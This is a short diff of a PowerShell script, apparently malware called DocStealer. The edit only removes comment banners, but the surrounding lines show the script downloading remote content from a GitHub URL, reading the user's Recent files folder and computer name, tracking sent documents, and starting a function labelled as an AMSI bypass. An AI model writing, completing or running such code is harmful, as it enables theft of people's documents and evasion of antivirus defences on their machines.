@@ -1,7 +1,5 @@
 Add-Type -AssemblyName System.Security
 
-
-##### GLOBAL #####
 $fromHere = [System.Web.HttpUtility]::UrlDecode("https%3A%2F%2Fraw.githubusercontent.com%2Fnatasaka%2FDocStealer%2Fmain%2FSecret")
 $Content = (New-Object Net.Webclient).DownloadString($fromHere)
 [string[]]$Bytes = $Content.Split("`n")
@@ -10,7 +8,7 @@ $docsSent =  New-Object Collections.Generic.List[String]
 $appData = [Environment]::GetFolderPath('ApplicationData') + "\Microsoft\Windows\Recent"
 $temp = [Environment]::GetFolderPath('ApplicationData')
 $compName = $env:computername | Select-Object
-##################
+
 
 # AMSI ByPass
 function AmsiBypass {
